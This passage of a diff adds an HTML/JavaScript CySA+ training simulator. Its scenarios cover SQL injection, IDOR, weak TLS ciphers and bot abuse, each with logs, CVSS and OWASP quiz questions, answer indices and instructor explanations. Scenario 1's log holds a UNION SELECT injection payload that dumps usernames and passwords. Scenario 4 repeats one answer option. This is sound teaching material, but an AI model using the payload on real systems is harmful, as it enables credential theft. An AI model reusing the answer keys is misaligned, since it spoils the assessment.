@@ -1,0 +1,935 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CySA+ Analyst Workbench</title>
+    <style>
+        :root {
+            --bg-color: #070a13;            /* Deep Space Midnight Blue */
+            --card-bg: #141b2d;             /* Elevated Slate Navy Panel */
+            --secondary-bg: #0f1524;        /* Darker utility backing */
+            --border-color: #242f47;        /* Crisp, low-glow border boundaries */
+            
+            --text-main: #e2e8f0;           /* High-contrast crisp Ice White */
+            --text-muted: #94a3b8;          /* Soft gray-blue for secondary elements */
+            
+            --primary-accent: #38bdf8;     /* Cyber Cyan for primary controls */
+            --primary-hover: #7dd3fc;      /* Active hover state */
+            --terminal-bg: #030712;         /* True dark core for forensic logs */
+            --terminal-text: #e2e8f0;       /* Base log color */
+            
+            --success: #22c55e;             /* Matrix Emerald */
+            --error: #ef4444;               /* Crimson Red */
+            --accent: #f59e0b;              /* Vivid Amber */
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        header {
+            background-color: var(--secondary-bg);
+            color: white;
+            padding: 14px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--border-color);
+            z-index: 10;
+        }
+
+        .header-title h1 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            color: var(--text-main);
+        }
+
+        .header-title span {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        .controls {
+            display: flex;
+            gap: 14px;
+            align-items: center;
+        }
+
+        select {
+            padding: 10px 18px;
+            border-radius: 6px;
+            border: 2px solid var(--border-color);
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-weight: 600;
+            cursor: pointer;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        select:hover {
+            border-color: var(--primary-accent);
+        }
+
+        button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-assist {
+            background-color: #78350f;
+            color: #fef3c7;
+            border: 1px solid var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .btn-assist:hover {
+            background-color: #92400e;
+        }
+
+        .btn-submit {
+            background-color: var(--primary-accent);
+            color: #070a13;
+        }
+
+        .btn-submit:hover {
+            background-color: var(--primary-hover);
+        }
+
+        main {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .workspace-left {
+            flex: 1.25;
+            border-right: 2px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+            background-color: var(--secondary-bg);
+            overflow: hidden;
+        }
+
+        .tabs {
+            display: flex;
+            background-color: #0b111e;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .tab {
+            padding: 14px 22px;
+            cursor: pointer;
+            border: none;
+            background: none;
+            font-weight: 600;
+            color: var(--text-muted);
+            border-right: 2px solid var(--border-color);
+            transition: all 0.2s;
+        }
+
+        .tab.active {
+            background-color: var(--secondary-bg);
+            color: var(--primary-accent);
+            border-bottom: 3px solid var(--primary-accent);
+        }
+
+        .tab-content {
+            padding: 26px;
+            overflow-y: auto;
+            flex: 1;
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .plain-language-box {
+            background-color: #1e293b;
+            border-left: 4px solid var(--primary-accent);
+            color: #e2e8f0;
+            padding: 16px;
+            margin-top: 24px;
+            border-radius: 6px;
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+
+        .workspace-right {
+            flex: 1;
+            background-color: var(--bg-color);
+            padding: 26px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        .task-card {
+            background: var(--card-bg);
+            padding: 22px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            border-left: 5px solid var(--primary-accent);
+            transition: all 0.3s ease;
+        }
+
+        .task-card h3 {
+            font-size: 1.05rem;
+            margin-bottom: 14px;
+            color: var(--text-main);
+            font-weight: 700;
+        }
+
+        .options-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .option-label {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 14px;
+            border: 1px solid var(--border-color);
+            background-color: var(--secondary-bg);
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .option-label:hover {
+            background-color: #1e293b;
+            border-color: var(--primary-accent);
+        }
+
+        .option-label input {
+            margin-top: 4px;
+            accent-color: var(--primary-accent);
+        }
+
+        .artifact-box {
+            background-color: var(--terminal-bg);
+            color: var(--terminal-text);
+            font-family: "Courier New", Courier, monospace;
+            padding: 20px;
+            border-radius: 6px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            margin-top: 14px;
+            font-size: 0.88rem;
+            line-height: 1.6;
+            border: 1px solid var(--border-color);
+            border-left: 4px solid var(--primary-accent);
+        }
+
+        .log-highlight {
+            color: #f43f5e;
+            font-weight: bold;
+            background-color: rgba(244, 63, 94, 0.1);
+            padding: 1px 4px;
+            border-radius: 3px;
+        }
+
+        .log-context {
+            color: #34d399;
+        }
+
+        .brief-item {
+            margin-bottom: 18px;
+            line-height: 1.6;
+            font-size: 0.95rem;
+            color: var(--text-main);
+        }
+
+        .brief-item strong {
+            color: var(--primary-accent);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(3, 7, 18, 0.85);
+            backdrop-filter: blur(6px);
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+
+        .modal-content {
+            background-color: var(--card-bg);
+            border: 2px solid var(--border-color);
+            color: var(--text-main);
+            padding: 34px;
+            border-radius: 12px;
+            width: 92%;
+            max-width: 780px;
+            max-height: 85vh;
+            overflow-y: auto;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.7);
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--border-color);
+            padding-bottom: 14px;
+            margin-bottom: 20px;
+        }
+
+        .close-modal {
+            font-size: 1.75rem;
+            cursor: pointer;
+            color: var(--text-muted);
+            transition: color 0.2s;
+        }
+
+        .close-modal:hover {
+            color: var(--error);
+        }
+
+        .assist-subtitle {
+            font-size: 1.05rem;
+            color: var(--primary-accent);
+            margin: 14px 0 6px 0;
+            font-weight: 700;
+        }
+
+        .assist-section {
+            background-color: #1e293b;
+            border-left: 4px solid var(--accent);
+            color: #f1f5f9;
+            padding: 16px;
+            border-radius: 6px;
+            margin-bottom: 18px;
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+
+        .vector-string-box {
+            background-color: var(--terminal-bg);
+            color: #34d399;
+            font-family: monospace;
+            padding: 14px;
+            border-radius: 6px;
+            margin: 16px 0;
+            font-size: 1rem;
+            letter-spacing: 0.5px;
+            text-align: center;
+            border: 1px solid var(--border-color);
+        }
+
+        .correct-highlight {
+            background-color: rgba(34, 197, 94, 0.12) !important;
+            border-left: 6px solid var(--success) !important;
+            border-color: rgba(34, 197, 94, 0.4) !important;
+        }
+
+        .incorrect-highlight {
+            background-color: rgba(239, 68, 68, 0.12) !important;
+            border-left: 6px solid var(--error) !important;
+            border-color: rgba(239, 68, 68, 0.4) !important;
+        }
+
+        .feedback-banner {
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            display: none;
+            font-weight: 700;
+            font-size: 1.05rem;
+            text-align: center;
+            border: 1px solid transparent;
+        }
+
+        .decoder-section {
+            margin-top: 22px;
+            border-top: 1px solid var(--border-color);
+            padding-top: 16px;
+        }
+
+        .decoder-title {
+            font-size: 0.78rem;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            margin-bottom: 12px;
+        }
+
+        .decoder-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            overflow: hidden;
+            margin-bottom: 8px;
+            font-size: 0.875rem;
+        }
+
+        .decoder-raw {
+            background-color: var(--terminal-bg);
+            font-family: "Courier New", Courier, monospace;
+            font-size: 0.8rem;
+            color: #94a3b8;
+            padding: 10px 14px;
+            border-right: 1px solid var(--border-color);
+            line-height: 1.5;
+            word-break: break-all;
+        }
+
+        .decoder-plain {
+            background-color: #0f1828;
+            color: var(--text-main);
+            padding: 10px 14px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-title">
+            <h1>CySA+ Analyst Workbench: OWASP Top 10 Assessment & CVSS Triage Simulator</h1>
+            <span>Security Engineering & Infrastructure Diagnostic Node</span>
+        </div>
+        <div class="controls">
+            <select id="scenario-selector" onchange="loadScenario(this.value)">
+                <option value="0">Scenario 1</option>
+                <option value="1">Scenario 2</option>
+                <option value="2">Scenario 3</option>
+                <option value="3">Scenario 4</option>
+                <option value="4">Scenario 5</option>
+                <option value="5">Scenario 6</option>
+                <option value="6">Scenario 7</option>
+                <option value="7">Scenario 8</option>
+                <option value="8">Scenario 9</option>
+                <option value="9">Scenario 10</option>
+            </select>
+            <button class="btn-assist" onclick="openAssistModal()">💡 Instructor Assist Matrix</button>
+            <button class="btn-submit" onclick="gradeSimulation()">Verify Blueprint Answers</button>
+        </div>
+    </header>
+
+    <main>
+        <section class="workspace-left">
+            <div class="tabs">
+                <button class="tab active" onclick="switchTab(event, 'alert-tab')">SIEM Alert Context</button>
+                <button class="tab" onclick="switchTab(event, 'log-tab')">Forensic Evidence</button>
+                <button class="tab" onclick="switchTab(event, 'intel-tab')">Threat Intel</button>
+            </div>
+
+            <div id="alert-tab" class="tab-content active">
+                <h2 style="font-size:1.2rem; margin-bottom:12px; color:var(--primary-accent);">Incident Detection Alert Summary</h2>
+                <p id="alert-text" style="line-height: 1.6; font-size: 1rem; color: var(--text-main);"></p>
+                <div class="plain-language-box" id="plain-language-text"></div>
+            </div>
+
+            <div id="log-tab" class="tab-content">
+                <h2 style="font-size:1.2rem; margin-bottom:12px; color:var(--primary-accent);">Target System Forensic Evidence Logs</h2>
+                <div class="artifact-box" id="log-artifact"></div>
+                <div class="decoder-section">
+                    <div class="decoder-title">&#128203; Line-by-Line Breakdown</div>
+                    <div id="log-decoder-rows"></div>
+                </div>
+            </div>
+
+            <div id="intel-tab" class="tab-content">
+                <h2 style="font-size:1.2rem; margin-bottom:12px; color:var(--primary-accent);">Contextual Threat Feed & Policy Parameters</h2>
+                <div id="intel-text"></div>
+            </div>
+        </section>
+
+        <section class="workspace-right" id="assessment-panel">
+            <div id="status-banner" class="feedback-banner"></div>
+
+            <div class="task-card" id="card-task1">
+                <h3>Task 1: OWASP Top 10 Root Cause Mapping</h3>
+                <div class="options-group" id="options-task1"></div>
+            </div>
+            <div class="task-card" id="card-task2">
+                <h3>Task 2: CVSS 3.1 Base Metrics Vector Alignment</h3>
+                <div class="options-group" id="options-task2"></div>
+            </div>
+            <div class="task-card" id="card-task3">
+                <h3>Task 3: CVSS 3.1 Temporal Metric Calibration</h3>
+                <div class="options-group" id="options-task3"></div>
+            </div>
+            <div class="task-card" id="card-task4">
+                <h3>Task 4: Incident Lifecycle Response Containment Action</h3>
+                <div class="options-group" id="options-task4"></div>
+            </div>
+        </section>
+    </main>
+
+    <div id="assist-modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 style="font-size:1.3rem; color:var(--primary-accent);" id="assist-title">Instructor Assist Cheat Sheet</h2>
+                <span class="close-modal" onclick="closeModal('assist-modal')">&times;</span>
+            </div>
+            <div id="assist-content"></div>
+        </div>
+    </div>
+
+    <div id="breakdown-modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 style="font-size:1.4rem; color:var(--primary-accent);">Simulated Performance Metrics & Blueprint Analysis</h2>
+                <span class="close-modal" onclick="closeModal('breakdown-modal')">&times;</span>
+            </div>
+            <div id="breakdown-content"></div>
+        </div>
+    </div>
+
+    <script>
+        const scenarios = [
+            // SCENARIO 1: A03 INJECTION
+            {
+                alert: "At 03:14 UTC, the internal SIEM engine triggered a critical data exfiltration alert tracking the DMZ segment hosting the public medical ledger. The source profile shows connection origin tracking back to an unauthenticated internet node making direct script queries via standard HTTP port 443.",
+                plainLanguage: "An unauthenticated attacker on the internet is trying to steal your entire medical database by injecting database commands right into a public web parameter box. They haven't hacked the server's operating system itself, but they're successfully extracting raw records.",
+                log: `<span class="log-context"># Identity Context: SecurityState=UNAUTHENTICATED | TokenState=NULL</span>\n<span class="log-context"># Host Status: ContextAuthority=DATABASE_PROCESS_ISOLATION | ExecutionShell=DISABLED</span>\n\n203.0.113.88 - "GET /portal/view.php?id=14<span class="log-highlight">+UNION+SELECT+null,username,password+FROM+users+--+</span> HTTP/1.1" 200 4821`,
+                logDecoder: [
+  { line: "SecurityState=UNAUTHENTICATED | TokenState=NULL", plain: "The request came from someone with no login session — a complete stranger on the internet." },
+  { line: "ContextAuthority=DATABASE_PROCESS_ISOLATION | ExecutionShell=DISABLED", plain: "The database runs in a sandbox. Even if the attacker wins, they can't run OS commands — damage is limited to data." },
+  { line: "GET /portal/view.php?id=14+UNION+SELECT+...", plain: "The attacker appended SQL commands into the URL. The +UNION+SELECT means they're trying to bolt a second query onto the real one to dump the users table." },
+  { line: "HTTP/1.1 200 4821", plain: "Status 200 = the server accepted it. 4821 bytes returned — that's real data being handed back to the attacker." }
+],
+                intel: "<div class='brief-item'><strong>Vulnerability Assessment:</strong> The application parsing backend directly processes raw input into database syntax without parameterization. The targeted data engine architecture keeps database file manipulation confined purely to the isolated database service schema; the flaw does not allow command translation to the host OS.</div><div class='brief-item'><strong>Exploit Code Maturity:</strong> Threat tracking confirms that <span class='log-highlight'>functional exploit scripts are widely available on open repositories like GitHub</span> and can be deployed out-of-the-box.</div><div class='brief-item'><strong>Remediation State:</strong> No vendor patch exists at this moment. However, network specialists confirm that <span class='log-highlight'>a temporary operational workaround is immediately available</span> via WAF regex drops to discard malicious strings.</div>",
+                tasks: {
+                    t1: { q: "Map this vulnerability to the correct OWASP Top 10 (2021) designation.", options: ["A01:2021-Broken Access Control", "A03:2021-Injection", "A05:2021-Security Misconfiguration", "A07:2021-Identification and Authentication Failures"], ans: 1 },
+                    t2: { q: "Evaluate the log artifacts to isolate the Base Metrics.", options: ["AV:N / PR:H / S:C", "AV:A / PR:N / S:U", "AV:N / PR:N / S:U", "AV:N / PR:L / S:C"], ans: 2 },
+                    t3: { q: "Calibrate Exploit Code Maturity (E) and Remediation Level (RL) based on the Threat Intel brief.", options: ["E:H / RL:O", "E:F / RL:W", "E:P / RL:T", "E:U / RL:U"], ans: 1 },
+                    t4: { q: "Which action should a Tier 2 analyst invoke FIRST for containment according to the incident lifecycle?", options: ["Schedule an emergency architecture development sprint to rewrite the app code.", "Force the main production database offline to halt any reading blocks.", "Activate the custom regex drop filtering template on the corporate edge WAF.", "Compile a formal external compliance disclosure statement for state regulatory offices."], ans: 2 }
+                },
+                assist: `<div class="assist-subtitle">Why this maps to A03:2021-Injection</div>
+                <div class="assist-section">Look closely at the HTTP parameter string: <code>UNION SELECT</code> and query termination syntax (<code>--</code>). Passing structured interpretation syntax directly into databases without data validation boundaries defines SQL Injection, a core component of the <strong>Injection</strong> category.</div>
+                <div class="assist-subtitle">Why Base Metrics are AV:N / PR:N / S:U</div>
+                <div class="assist-section">
+                    • <strong>Attack Vector (Network):</strong> Launched across public internet routes via port 443.<br>
+                    • <strong>Privileges Required (None):</strong> The logs state <code>SecurityState=UNAUTHENTICATED</code>; it targets a public asset without active login checks.<br>
+                    • <strong>Scope (Unchanged):</strong> The data compromise is isolated entirely to the database engine boundaries (<code>ExecutionShell=DISABLED</code>); the exploit cannot manipulate the host OS ecosystem.
+                </div>
+                <div class="assist-subtitle">Why Temporal & Containment are E:F / RL:W / WAF Drop</div>
+                <div class="assist-section">Pre-written weaponized code on public archives dictates <strong>Functional (E:F)</strong> maturity. A defensive filter matching bad characters without modifying native app source maps directly to a <strong>Workaround (RL:W)</strong>. Activating this WAF filter fulfills containment rules by neutralizing the threat instantly without knocking the production app offline.</div>`,
+                breakdown: "<h3>Instructor Ledger</h3><div class='vector-string-box'>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:F/RL:W</div><p><strong>A03: Injection</strong>. The application concatenated untrusted data into a backend query. Since the attack is launched remotely without credentials and remains isolated within the database wrapper, it tracks as AV:N/PR:N/S:U. Deploying a WAF block rule acts as an immediate compensating control (Workaround) to maintain service availability during containment.</p>"
+            },
+            // SCENARIO 2: A01 BROKEN ACCESS CONTROL
+            {
+                alert: "At 11:42 UTC, monitors flagged data routing changes assigned to an internal, credentialed contractor profile. The user context originates from a low-clearance provisioning group but is successfully pulling confidential senior workforce compensation metrics.",
+                plainLanguage: "A temporary contractor who is logged in with low permissions is poking around your web URL, changing the number at the end of the address line to read other employees' private HR profiles. The system is letting them read files they shouldn't be allowed to see.",
+                log: `<span class="log-context"># Identity Context: SecurityState=AUTHENTICATED | TokenState=VALID_LEASE</span>\n<span class="log-context"># Identity Profile: UserPrincipalName=j_doe_temp | AssignGroup=External_Contractor_Tier1</span>\n\n10.142.44.11 - j_doe_temp [04/Jun] "GET /api/v1/workforce/profile?<span class="log-highlight">user_id=8801</span>" 200 1420\n10.142.44.11 - j_doe_temp [04/Jun] "GET /api/v1/workforce/profile?<span class="log-highlight">user_id=8802</span>" 200 9410`,
+                logDecoder: [
+  { line: "SecurityState=AUTHENTICATED | TokenState=VALID_LEASE", plain: "This person is legitimately logged in with a valid session — not an outsider, but an insider abusing their access." },
+  { line: "UserPrincipalName=j_doe_temp | AssignGroup=External_Contractor_Tier1", plain: "The account is a temp contractor with the lowest permission tier. They should only see their own data." },
+  { line: "GET /api/v1/workforce/profile?user_id=8801 → 200 1420", plain: "They requested employee #8801's HR record. Got a 200 OK — the server handed it over without checking if they're allowed." },
+  { line: "GET /api/v1/workforce/profile?user_id=8802 → 200 9410", plain: "They incremented the ID by 1 and did it again. This is the IDOR pattern — walking through records by guessing sequential IDs. 9410 bytes returned means a bigger record (likely salary/comp data)." }
+],
+                intel: "<div class='brief-item'><strong>Vulnerability Assessment:</strong> The application validates basic login parameters but completely skips record-level authorization checks. A valid lower-clearance consumer session can manipulate numeric string indexes to extract records belonging to other users. The exploit has zero capability to alter host OS configurations.</div><div class='brief-item'><strong>Exploit Code Maturity:</strong> Threat analytics prove that <span class='log-highlight'>no automated public exploit code is currently known to exist</span>; data scraping can only be completed via manual address bar alterations.</div><div class='brief-item'><strong>Remediation State:</strong> Software engineering states that <span class='log-highlight'>an internal software hotfix patch can be delivered inside a 4-hour staging window</span> to enforce programmatic access lookups.</div>",
+                tasks: {
+                    t1: { q: "Identify the OWASP category characterized by this missing record-level validation check.", options: ["A01:2021-Broken Access Control", "A02:2021-Cryptographic Failures", "A04:2021-Insecure Design", "A08:2021-Software and Data Integrity Failures"], ans: 0 },
+                    t2: { q: "Derive the base metrics profile for this API data exposure.", options: ["AV:N / PR:N / S:U", "AV:N / PR:L / S:U", "AV:L / PR:H / S:C", "AV:A / PR:L / S:C"], ans: 1 },
+                    t3: { q: "Derive the correct CVSS 3.1 Temporal configuration.", options: ["E:U / RL:T", "E:P / RL:O", "E:H / RL:W", "E:F / RL:U"], ans: 0 },
+                    t4: { q: "Which operational response action limits exposure without disturbing broad connectivity?", options: ["Revoke or suspend the active directory account lease for identity 'j_doe_temp'.", "Rebuild the global software-defined networking routing schemas.", "Issue a wide-scale corporate notice alerting employees.", "Implement client-side hardware tokens on all endpoints."], ans: 0 }
+                },
+                assist: `<div class="assist-subtitle">Why this maps to A01:2021-Broken Access Control</div>
+                <div class="assist-section">The log reveals horizontal credential crawling (iterating <code>user_id=8801</code> to <code>8802</code>). When a system validates authentication but fails to enforce granular object authorization boundaries, it is an Insecure Direct Object Reference (IDOR), a subset of <strong>Broken Access Control</strong>.</div>
+                <div class="assist-subtitle">Why Base Metrics are AV:N / PR:L / S:U</div>
+                <div class="assist-section">
+                    • <strong>Attack Vector (Network):</strong> Launched over network routing segments via standard API channels.<br>
+                    • <strong>Privileges Required (Low):</strong> The system blocks public access; requests are processed only under a valid session token (<code>SecurityState=AUTHENTICATED</code>), indicating base user permissions are required.<br>
+                    • <strong>Scope (Unchanged):</strong> The impact is limited entirely to data objects within the web application domain, meaning the security scope is Unchanged.
+                </div>
+                <div class="assist-subtitle">Why Temporal & Containment are E:U / RL:T / Account Revocation</div>
+                <div class="assist-section">"No automated public code known" maps strictly to <strong>Unproven (E:U)</strong>. A rapid engineering hotfix patch equals a <strong>Temporary Fix (RL:T)</strong>. For targeted containment, disabling the single malicious account stops data exposure without breaking availability for legitimate users.</div>`,
+                breakdown: "<h3>Instructor Ledger</h3><div class='vector-string-box'>CVSS:3.1/AV:N/AC:L/PR:L/S:U/C:H/I:N/A:N/E:U/RL:T</div><p><strong>A01: Broken Access Control</strong>. The flaw represents an authorization bypass. Because standard low privileges (PR:L) are required to access the endpoint, it tracks as PR:L. Zero public tooling code marks Exploit Maturity as Unproven (E:U). Account revocation isolates the threat actor instantly with minimal operational disruption.</p>"
+            },
+            // SCENARIO 3: A02 CRYPTOGRAPHIC FAILURES
+            {
+                alert: "During routine network packet analysis, the SOC detected sensitive B2B JSON payloads traversing the public internet using deprecated encryption standards, leaving authentication tokens vulnerable to Man-in-the-Middle (MitM) interception.",
+                plainLanguage: "Your company's web server is using an incredibly old, broken type of encryption (3DES) to send confidential client information across the open internet. A hacker can sit in the middle of the connection, crack the weak encryption, and read plain text data.",
+                log: `<span class="log-context"># Wireshark PCAP Stream Filter: tcp.port == 443</span>\n\nClient Hello ->\n<- Server Hello, Certificate, Server Key Exchange\n<span class="log-context">Cipher Suite Accepted:</span> <span class="log-highlight">TLS_RSA_WITH_3DES_EDE_CBC_SHA (0x000a)</span>\n<span class="log-context"># Cleartext Data Leaked: {"auth_token": "SESS7701", "phi_record": "99401"}</span>`,
+                logDecoder: [
+  { line: "Wireshark PCAP Stream Filter: tcp.port == 443", plain: "An analyst is capturing raw network traffic on port 443 (HTTPS). This is packet sniffing — watching what goes over the wire." },
+  { line: "Client Hello → Server Hello, Certificate, Server Key Exchange", plain: "This is the TLS handshake. The client and server are negotiating which encryption to use before sending any real data." },
+  { line: "Cipher Suite Accepted: TLS_RSA_WITH_3DES_EDE_CBC_SHA (0x000a)", plain: "The server agreed to use 3DES — an encryption algorithm from the 1970s that is officially broken. A well-positioned attacker can crack this." },
+  { line: "Cleartext Data Leaked: auth_token / phi_record", plain: "Because the encryption was cracked, the actual payload is now readable. An auth token (session key) and a PHI record ID (protected health data) are fully exposed." }
+],
+                intel: "<div class='brief-item'><strong>Vulnerability Assessment:</strong> The server permits connection downgrades to legacy 3DES over the public internet (unauthenticated interception). Scope is confined to the data in transit.</div><div class='brief-item'><strong>Exploit Code Maturity:</strong> MITM interception scripts targeting 3DES are <span class='log-highlight'>functional and widely available on GitHub</span>.</div><div class='brief-item'><strong>Remediation State:</strong> The vendor has released an <span class='log-highlight'>official patch registry update</span> to permanently disable legacy ciphers on the host.</div>",
+                tasks: {
+                    t1: { q: "Map this vulnerability to the correct OWASP category.", options: ["A02:2021-Cryptographic Failures", "A05:2021-Security Misconfiguration", "A09:2021-Security Logging and Monitoring", "A10:2021-Server-Side Request Forgery"], ans: 0 },
+                    t2: { q: "Evaluate the log artifacts to isolate the Base Metrics.", options: ["AV:A / PR:N / S:C", "AV:N / PR:H / S:U", "AV:N / PR:N / S:U", "AV:L / PR:L / S:U"], ans: 2 },
+                    t3: { q: "Calibrate the Temporal configuration.", options: ["E:U / RL:T", "E:F / RL:O", "E:P / RL:W", "E:H / RL:U"], ans: 1 },
+                    t4: { q: "What is the most appropriate permanent remediation step?", options: ["Deploy a WAF to inspect cleartext strings.", "Configure the server to exclusively accept TLS 1.2/1.3 and disable 3DES/RC4 suites.", "Implement AES-256 for database at-rest storage.", "Rotate all administrative active directory passwords."], ans: 1 }
+                },
+                assist: `<div class="assist-subtitle">Why this maps to A02:2021-Cryptographic Failures</div>
+                <div class="assist-section">The log flags negotiation of <code>3DES_EDE_CBC_SHA</code>. Exposing keys or processing transactions over legacy, structurally broken cryptographic ciphers maps directly to <strong>Cryptographic Failures</strong>.</div>
+                <div class="assist-subtitle">Why Base Metrics are AV:N / PR:N / S:U</div>
+                <div class="assist-section">
+                    • <strong>Attack Vector (Network):</strong> Data transit flows over standard internet wire routes.<br>
+                    • <strong>Privileges Required (None):</strong> Capturing data in transit requires no pre-existing privileges on the target server application infrastructure.<br>
+                    • <strong>Scope (Unchanged):</strong> Cryptographic exposure compromises data objects inside the stream but does not grant direct control over peer host entities.
+                </div>
+                <div class="assist-subtitle">Why Temporal & Containment are E:F / RL:O / Protocol Hardening</div>
+                <div class="assist-section">GitHub interception code indicates <strong>Functional (E:F)</strong> maturity. The vendor registry package is an <strong>Official Patch (RL:O)</strong>. Root-cause remediation requires modifying server configurations to restrict allowed cipher suites, explicitly dropping deprecated protocols.</div>`,
+                breakdown: "<h3>Instructor Ledger</h3><div class='vector-string-box'>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:F/RL:O</div><p><strong>A02: Cryptographic Failures</strong>. Transmitting data via weak protocols allows third-party decryption. The exploit utilizes public networks (AV:N) and requires zero account privileges (PR:N). Modifying host properties via the official vendor registry update represents a complete, official fix (RL:O).</p>"
+            },
+            // SCENARIO 4: A04 INSECURE DESIGN
+            {
+                alert: "The customer service portal was overwhelmed by automated bots. The business logic allows unauthenticated users to reserve up to 5,000 inventory items indefinitely simply by clicking 'Hold', bypassing standard checkout entirely. No anti-automation was designed into the workflow.",
+                plainLanguage: "The website was designed poorly without automated protections like CAPTCHAs or buy limits. Because of this structural mistake, internet bots can instantly lock up all of your inventory items for free, causing an immediate denial of service to actual customers.",
+                log: `<span class="log-context"># WAF Traffic Profiler</span>\n<span class="log-context"># Event: Concurrent massive parallel reservations via legitimate application routing.</span>\n\n198.51.100.4 - "POST /api/reserve HTTP/1.1" 200 0.05s\n198.51.100.4 - "POST /api/reserve HTTP/1.1" 200 0.05s\n<span class="log-highlight">[Warning: 5,000 items locked in 0.15 seconds. No CAPTCHA or rate limits triggered.]</span>`,
+                logDecoder: [
+  { line: "# WAF Traffic Profiler / Event: Concurrent massive parallel reservations", plain: "The WAF is logging traffic. The comment tells us these are real requests through the normal app flow — not an attack bypassing security, but the app doing exactly what it was coded to do." },
+  { line: "198.51.100.4 - POST /api/reserve - 200 - 0.05s (×2 shown)", plain: "One IP, hitting the reservation endpoint. Each call succeeds (200) in 0.05 seconds. A human can't click that fast — this is automated." },
+  { line: "[Warning: 5,000 items locked in 0.15 seconds. No CAPTCHA or rate limits triggered.]", plain: "The bot reserved 5,000 items in under a quarter of a second. No throttle fired because none was ever built. This is the design flaw — the protection was simply never designed in." }
+],
+                intel: "<div class='brief-item'><strong>Vulnerability Assessment:</strong> This is a fundamental flaw in the business logic workflow, allowing external bots to cause business-logic Denial of Service without needing privileges. Scope remains contained to the app inventory.</div><div class='brief-item'><strong>Exploit Code Maturity:</strong> The exploit is highly automated and <span class='log-highlight'>functional scripts are widely shared</span> among scalper networks.</div><div class='brief-item'><strong>Remediation State:</strong> Because the flaw is architectural, there is <span class='log-highlight'>no patch available</span>; the entire module requires secure redesign.</div>",
+                tasks: {
+                    t1: { q: "Which OWASP category best describes this missing architectural protection mechanism?", options: ["A03:2021-Injection", "A04:2021-Insecure Design", "A06:2021-Vulnerable Components", "A08:2021-Software and Data Integrity"], ans: 1 },
+                    t2: { q: "Derive the base metrics profile for this threat.", options: ["AV:N / PR:N / S:U", "AV:A / PR:L / S:U", "AV:N / PR:N / S:U", "AV:L / PR:N / S:C"], ans: 2 },
+                    t3: { q: "Calibrate the Temporal configuration.", options: ["E:F / RL:U", "E:P / RL:T", "E:H / RL:O", "E:U / RL:W"], ans: 0 },
+                    t4: { q: "Which compensating control should be deployed while the app is redesigned?", options: ["Implement strict IP Allow-listing for customers.", "Deploy WAF rate-limiting and enforce CAPTCHA challenges on the reservation endpoint.", "Encrypt the inventory database.", "Upgrade the server OS to a hardened Linux baseline."], ans: 1 }
+                },
+                assist: `<div class="assist-subtitle">Why this maps to A04:2021-Insecure Design</div>
+                <div class="assist-section">The program executes as written, but the business requirement lacks defense-in-depth (missing rate limits, anti-bot controls, token limits). This structural lack of defenses defines <strong>Insecure Design</strong>.</div>
+                <div class="assist-subtitle">Why Base Metrics are AV:N / PR:N / S:U</div>
+                <div class="assist-section">
+                    • <strong>Attack Vector (Network):</strong> Bots access via standard web parameters.<br>
+                    • <strong>Privileges Required (None):</strong> Unauthenticated endpoints require zero credentials (PR:N).<br>
+                    • <strong>Scope (Unchanged):</strong> Impact is contained entirely to the product inventory data context.
+                </div>
+                <div class="assist-subtitle">Why Temporal & Containment are E:F / RL:U / WAF Controls</div>
+                <div class="assist-section">Functional scalper scripts translate to <strong>Functional (E:F)</strong>. Since it is an inherent design requirement flaw, there is no quick software patch, rendering remediation <strong>Unavailable (RL:U)</strong>. Deploying a WAF with rate-limiting and CAPTCHAs acts as a necessary compensating control.</div>`,
